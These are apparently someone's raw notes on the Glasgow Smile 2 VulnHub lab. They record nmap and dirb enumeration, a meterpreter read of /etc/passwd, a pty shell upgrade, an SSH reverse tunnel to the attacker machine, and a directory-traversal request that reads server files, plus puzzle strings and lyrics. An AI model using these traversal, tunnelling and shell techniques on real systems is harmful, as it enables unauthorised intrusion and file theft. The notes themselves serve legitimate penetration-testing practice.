@@ -1,0 +1,187 @@
+https://h0j3n.medium.com/vulnhub-glasgow-smile-2-1419ebe66a3b
+https://ksdpmx.bitbucket.io/2020/08/11/glasgow-smile-2-513/
+https://www.hackingarticles.in/port-forwarding-tunnelling-cheatsheet/
+https://ksdpmx.bitbucket.io/2020/08/11/glasgow-smile-2-513/
+
+
+
+└─$ sudo nmap -sT -A -Pn -n -p- 192.168.53.129
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 09:47 CEST
+Nmap scan report for 192.168.53.129
+Host is up (0.00086s latency).
+Not shown: 65531 closed ports
+PORT     STATE    SERVICE    VERSION
+22/tcp   open     ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 b7:e0:26:c4:a8:48:1f:64:bb:e2:87:c2:4a:ec:13:8a (RSA)
+|   256 b6:b8:19:ec:2e:06:20:65:be:25:0e:a6:49:7e:0d:f6 (ECDSA)
+|_  256 10:99:fa:8d:0d:60:ff:32:4d:6c:a2:28:e4:6e:d8:80 (ED25519)
+80/tcp   open     http       Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+83/tcp   open     http       Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+8080/tcp filtered http-proxy
+MAC Address: 00:0C:29:E3:0F:11 (VMware)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.86 ms 192.168.53.129
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
+
+└─$ dirb http://192.168.53.129:83 -X .txt
+└─$ curl http://192.168.53.129:83/todo.txt                                             2 ⨯
+         (          
+ (       )\ )    )  
+ )\ )   (()/( ( /(  
+(()/(    /(_)))(_)) 
+ /(_))_ (_)) ((_)   
+(_)) __|/ __||_  )  
+  | (_ |\__ \ / /   
+   \___||___//___|  
+                    
+
+
+TODO:
+
+Remember to delete the file after you finish writing the bash automatic script.
+
+Do I really look like a guy with a plan? You know what I am? I'm a dog chasing cars.
+
+I wouldn't know what to do with one if I caught it! You know, I just... do things.
+
+Joker
+
+
+meterpreter > cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/bin/lshell
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+bane:x:1000:1000:bane,,,:/home/bane:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
+carnage:x:1001:1001:carnage,,,:/home/carnage:/bin/bash
+venom:x:1002:1002:venom,,,:/home/venom:/bin/bash
+riddler:x:1003:1003:Riddler,,,:/home/riddler:/bin/bash
+
+
+
+python -c "import pty; pty.spawn('/bin/sh')"
+$ ssh -R 192.168.53.1:8080:127.0.0.1:8080 kali@192.168.53.1                                                                     
+
+ssh -L 8081:localhost:8080 -N -f -l raj 192.168.1.108
+
+
+└─$ curl http://127.0.0.1:8080/?page=../../../../../../../../../../../../etc/nginx/sites-enabled/default.conf | grep -v "^#"
+
+
+location /helpmeriddlernewapplication {
+        root   /var/www/myplace/hereis/threatened/;
+        index  index.php;
+
+    }
+
+http://127.0.0.1:8080/?page=../../../../../../../../../../../../var/www/myplace/hereis/threatened/index.php
+
+the human brain
+
+J2h3cUy5Sc4gXLp5VXrE
+
+riddler@glasgowsmile2:~/theworldmustbeburned$ cat message.txt 
+Your keys:
+Key 1: I make them laught a lot
+Key 2: Because jokers are wild
+Encrypted string:2188F2236A2200F2236A2269F2301A2263F2291A2186F2299A2255F2300A2186F2287A2268F2291A2264F2229A2270F2222A2262F2301A2265F2297A2259F2300A2257F2222A2256F2301A2268F2222A2251F2300A2275F2306A2258F2295A2264F2293A2186F2298A2265F2293A2259F2289A2251F2298A2198F2222A2262F2295A2261F2291A2186F2299A2265F2300A2255F2311A2200F2222A2238F2294A2255F2311A2186F2289A2251F2300A2193F2306A2186F2288A2255F2222A2252F2301A2271F2293A2258F2306A2198F2222A2252F2307A2262F2298A2259F2291A2254F2234A2186F2304A2255F2287A2269F2301A2264F2291A2254F2234A2186F2301A2268F2222A2264F2291A2257F2301A2270F2295A2251F2306A2255F2290A2186F2309A2259F2306A2258F2236A2186F2273A2265F2299A2255F2222A2263F2291A2264F2222A2260F2307A2269F2306A2186F2309A2251F2300A2270F2222A2270F2301A2186F2309A2251F2306A2253F2294A2186F2306A2258F2291A2186F2309A2265F2304A2262F2290A2186F2288A2271F2304A2264F2236A2188F2222A2239F2260A2240F2259A2205F2244A2225F2308A2239F2299A2229F2242A2238F2289A2244F2257A2274F2256A2258F2246A2272F2275A2223F2277A2271F2279A2255F2297A2221F2279A
+
+Oh my boots they shine
+
+And my bowler looks fine
+
+Take some time and care
+
+Take a look at my hair
+
+
+
+Oh yeah, oh yeah, oh yeah, I'm a joker in the pack
+
+Oh yeah, oh yeah, oh yeah, I'm a joker in the pack
+
+
+
+We hit the dance hall
+
+So smart and so chic
+
+I make them laugh a lot
+
+I make them accept me
+
+Secrets are spoken
+
+Plans are drawn in the dust
+
+With a gay bravado
+
+I'm taken into their trust
+
+
+
+Oh yeah, oh yeah, oh yeah, I'm a joker in the pack
+
+Oh yeah, oh yeah, oh yeah, I'm a joker in the pack
+
+
+
+Oh yeah, oh yeah, oh yeah I'm a joker in the pack
+
+Oh yeah, oh yeah, oh yeah I'm a..
+
+
+
+Oh my boots they shine
+
+And my bowler looks fine
+
+But don't confide in my smile
+
+Because jokers are wild
+
+
+
+Oh yeah, oh yeah, oh yeah, I'm a joker in the pack
+
+Oh yeah, oh yeah, oh yeah, I'm a joker in the pack
+
+Oh yeah, oh yeah, oh yeah, I'm a joker in the pack
